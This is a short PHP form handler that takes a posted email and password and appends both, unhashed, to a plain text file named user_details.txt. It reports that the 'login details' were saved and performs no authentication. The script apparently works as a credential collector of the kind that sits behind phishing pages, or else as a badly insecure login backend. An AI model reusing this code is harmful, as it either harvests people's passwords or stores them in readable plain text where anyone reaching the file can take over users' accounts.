<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if email and password are set and not empty
    if (isset($_POST['email']) && isset($_POST['password']) && !empty($_POST['email']) && !empty($_POST['password'])) {
        // Sanitize and validate email (you can use additional validation if needed)
        $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
        // You can also perform additional validation for email here if needed

        // Sanitize password (you may want to perform additional validation or hashing)
        $password = $_POST['password'];

        // Save the email and password into a text file
        $data = "Email: " . $email . "\n" . "Password: " . $password . "\n\n";
        $file = 'user_details.txt';

        // Open the file in append mode
        if ($handle = fopen($file, 'a')) {
            // Write the data to the file
            fwrite($handle, $data);
            // Close the file handle
            fclose($handle);
            // Display success message
            echo "Login details saved successfully!";
        } else {
            // Display error message if unable to open the file
            echo "Error: Unable to save login details.";
        }
    } else {
        // If email or password is not set or empty, show an error message
        echo "Error: Email and password are required.";
    }
} else {
    // If the request method is not POST, show an error message
    echo "Error: Invalid request.";
}
?>
